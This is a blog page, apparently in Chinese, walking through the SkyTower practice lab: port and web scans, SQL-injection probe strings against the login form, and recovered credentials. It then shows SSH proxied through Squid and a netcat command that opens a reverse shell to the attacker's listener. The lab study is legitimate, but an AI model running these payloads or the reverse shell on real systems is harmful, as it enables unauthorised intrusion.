@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>skytower · 随波逐流の旅店</title>
+<style>:root{--ink:#eaf3ff;--muted:#a9c3dd;--line:rgba(255,255,255,.2);--sky:#3aa3e3;--gold:#e0a545}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{min-height:100vh;color:var(--ink);font:16px/1.85 "PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;background:#0d2137 url('/SAO-bg.jpg') center/cover fixed no-repeat}
+body::before{content:'';position:fixed;inset:0;background:rgba(8,20,36,.7);z-index:-1}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:999px;background:rgba(226,236,248,.16);border:1px solid var(--line);color:#fff;text-decoration:none;font-size:14px;backdrop-filter:blur(12px);transition:.3s}
+.pill:hover{background:rgba(58,163,227,.5)}
+.wrap{max-width:860px;margin:0 auto;padding:44px 22px 80px}
+.panel{margin-top:18px;background:rgba(12,26,44,.62);border:1px solid var(--line);border-radius:20px;padding:34px 36px;backdrop-filter:blur(18px) saturate(140%);box-shadow:0 20px 50px rgba(5,16,30,.4)}
+h1{margin:0 0 14px;font-size:29px;line-height:1.4;color:#fff}
+.meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px;padding-bottom:18px;border-bottom:1px dashed var(--line)}
+.chip{padding:2px 11px;border-radius:999px;background:rgba(255,255,255,.12);border:1px solid var(--line);font-size:12px;color:var(--muted)}
+.chip.date{color:var(--gold)}
+article h2,article h3,article h4{color:#fff;margin:1.6em 0 .6em;line-height:1.45}
+article h2{font-size:23px;border-left:3px solid var(--sky);padding-left:12px}
+article h3{font-size:19px;color:#dcecff}
+article p{margin:.85em 0}
+article a{color:#8fd0ff}
+article img{max-width:100%;border-radius:10px;margin:14px 0}
+article ul,article ol{padding-left:1.5em}
+article li{margin:.35em 0}
+article blockquote{margin:1.2em 0;padding:10px 18px;border-left:3px solid var(--sky);background:rgba(255,255,255,.07);border-radius:0 10px 10px 0;color:var(--muted)}
+article code{background:rgba(255,255,255,.14);padding:2px 6px;border-radius:5px;font-size:.9em;color:#ffd9a8;font-family:Consolas,Monaco,monospace}
+article pre{background:rgba(6,14,26,.85);border:1px solid var(--line);border-radius:12px;padding:16px 18px;overflow:auto;margin:1.2em 0}
+article pre code{background:none;padding:0;color:#d6e6f7;font-size:13.5px;line-height:1.7}
+article table{width:100%;border-collapse:collapse;margin:1.2em 0;font-size:14px}
+article th,article td{border:1px solid var(--line);padding:8px 12px;text-align:left}
+article th{background:rgba(255,255,255,.07);color:#fff}
+article hr{border:none;border-top:1px dashed var(--line);margin:2em 0}
+.img-fallback{display:block;padding:18px;margin:14px 0;border:1px dashed var(--line);border-radius:10px;background:rgba(255,255,255,.05);color:var(--muted);font-size:13px;text-align:center}
+@media(max-width:640px){.panel{padding:22px 18px}.wrap{padding:24px 14px 60px}h1{font-size:22px}}</style>
+</head>
+<body>
+<div class="wrap">
+  <a class="pill" href="/article-list/">← 返回归档</a> <a class="pill" href="/">⌂ 主页</a>
+  <div class="panel">
+    <h1>skytower</h1>
+    <div class="meta"><span class="chip date">2024-12-12</span><span class="chip">分类·靶场</span><span class="chip">#靶场</span></div>
+    <article><h1>信息收集</h1>
+<p>上来永远是经典的nmap扫描端口</p>
+<pre><code class="language-ABAP">┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sS -sV -A -T5 -p- 192.168.199.138
+[sudo] kali 的密码：
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-12 14:03 CST
+Nmap scan report for 192.168.199.138
+Host is up (0.0011s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE    SERVICE    VERSION
+22/tcp   filtered ssh
+80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
+|_http-server-header: Apache/2.2.22 (Debian)
+|_http-title: Site doesn&#39;t have a title (text/html).
+3128/tcp open     http-proxy Squid http proxy 3.1.20
+|_http-title: ERROR: The requested URL could not be retrieved
+|_http-server-header: squid/3.1.20
+MAC Address: 00:0C:29:3E:4A:30 (VMware)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.2 - 3.16
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.12 ms 192.168.199.138
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 51.04 seconds
+</code></pre>
+<p>开放了22端口可以尝试ssh链接，开放了80端口可能有页面收集信息环节，3128端口是squid-http是一个代理端口
+ssh还是filtered状态，我们可以利用squid-http代理做端口转发开启 ssh</p>
+<p>访问192.168.199.138,发发现是一个登录框</p>
+<p>对于登录框
+我们的方法可以有</p>
+<pre><code class="language-ABAP">sql注入
+暴力破解
+cms框架漏洞
+插件漏洞
+数据库+中间件+框架
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/675a9fe9d0e0a243d4e2bd69.png" alt=""></p>
+<p><strong>nikto</strong>  可以看一下网站的东西</p>
+<pre><code class="language-ABAP">┌──(kali㉿kali)-[~]
+└─$ nikto -h http://192.168.199.138/
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.199.138
++ Target Hostname:    192.168.199.138
++ Target Port:        80
++ Start Time:         2024-12-12 16:40:28 (GMT8)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.22 (Debian)
++ /: Server may leak inodes via ETags, header found with file /, inode: 87, size: 1136, mtime: Fri Jun 20 19:23:36 2014. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /index: Uncommon header &#39;tcn&#39; found, with contents: list.
++ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for &#39;index&#39; were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
++ /login.php: Retrieved x-powered-by header: PHP/5.4.4-14+deb7u9.
++ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
++ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
++ /login.php: Admin login page/section found.
++ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
++ 8909 requests: 0 error(s) and 11 item(s) reported on remote host
++ End Time:           2024-12-12 16:40:37 (GMT8) (9 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre>
+<p>先尝试跑一个sql注入，github随便下一个字典然后直接跑，看输出里面的响应大小，</p>
+<p>那么怎么判断是不是sql注入漏洞</p>
+<pre><code class="language-ABAP">一般来说跑一下
+&#39; and &#39;1&#39; = &#39;1
+and 1&#39;1 = &#39;2
+and 1=1
+and sleep(5)
+and 1=2
+`--这种就差不多
+
+需要注意的是sql server，oracle注释可以用--,mysql可以用#,--
+
+/**/、 ;%00 、 /*letmetest*/
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/675bbcced0e0a243d4e35242.png" alt=""></p>
+<p>这里说你输入的sql语法有问题，所以是存在sql注入漏洞的</p>
+<p>sql注入原理可以去看前面的那个代码审计的，里面写了一下那个sql注入成因</p>
+<p>扯远了，回到靶机</p>
+<p><img src="https://pic.imgdb.cn/item/675bc043d0e0a243d4e352c3.png" alt=""></p>
+<p>看一下成功的，说了账号密码是john:hereisjohn,需要注意的是，给出来的是账号密码而你的登陆界面是email和密码，所以你不能通过这个登录进去</p>
+<p>我们这是应该是考虑之前的3128端口的</p>
+<p>代理有两种方式，分别是<code>proxychains</code>和<code>proxytunnel</code></p>
+<p>3128端口开启squid-http
+squid cache是流行最广的，使用最普遍的开源缓存代理服务器</p>
+<p>下载proxychains并在proxychains4.conf里面添加对面的ip地址端口号以及协议</p>
+<pre><code class="language-Actionscript">┌──(root㉿kali)-[~]
+└─# vi /etc/proxychains4.conf
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/676bd86bd0e0a243d4ea1876.png" alt=""></p>
+<p>然后使用proxychains4来代理</p>
+<pre><code class="language-Actionscript">proxychains ssh john@192.168.98.129
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/676bf101d0e0a243d4ea4a84.png" alt=""></p>
+<p>不能直接ssh连接，所以我们可以试试<code>-t cat /etc/passwd</code>看看能不能执行指令</p>
+<p><img src="https://pic.imgdb.cn/item/676bf14ed0e0a243d4ea4a8f.png" alt=""></p>
+<p>使用<code>where python</code>发现无回显，表明里面是没有安装python的,那我们试试nc连接</p>
+<pre><code class="language-Actionscript">┌──(root㉿kali)-[~]
+└─# proxychains ssh john@192.168.98.129 -t &#39;nc 192.168.98.128 6677 -e /bin/bash&#39;
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/i386-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  192.168.98.129:3128  ...  192.168.98.129:22  ...  OK
+john@192.168.98.129&#39;s password:
+
+另一边
+
+┌──(root㉿kali)-[~]
+└─# nc -vlp 6677
+listening on [any] 6677 ...
+192.168.98.129: inverse host lookup failed: Unknown host
+connect to [192.168.98.128] from (UNKNOWN) [192.168.98.129] 60305
+</code></pre>
+<p>或者我们用另一种的隧道连接方式，就是前面代理的方式我们换成proxytunnel隧道代理</p>
+<pre><code class="language-Actionscript">┌──(root㉿kali)-[~]
+└─# proxytunnel -p 192.168.98.129:3128 -d 127.0.0.1:22 -a 1234
+</code></pre>
+<p>建立一个代理隧道</p>
+<p>但是后面是一样的</p>
+<h3>pty小技巧</h3>
+<p>socat
+顺着这个题目，
+<img src="https://pic.imgdb.cn/item/676bfd6ad0e0a243d4ea4d91.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/676bfd6bd0e0a243d4ea4d92.png" alt=""></p>
+<pre><code class="language-Actionscript">通过python -m http.server 80开启http服务
+
+另一面直接wget
+</code></pre>
+<p>看了眼教程下一步是三方在nc里面执行socat然后在把shell弹另一个界面（我勒个甩锅）</p>
+</article>
+  </div>
+</div><script>
+  // 正文插图兜底：失效图片替换为占位块，避免出现破图
+  document.querySelectorAll('article img').forEach(function (img) {
+    img.loading = 'lazy';
+    img.addEventListener('error', function () {
+      var ph = document.createElement('span');
+      ph.className = 'img-fallback';
+      ph.textContent = '图片已失效 · ' + (img.getAttribute('alt') || '');
+      if (img.parentNode) img.parentNode.replaceChild(ph, img);
+    });
+  });
+</script></body>
+</html>
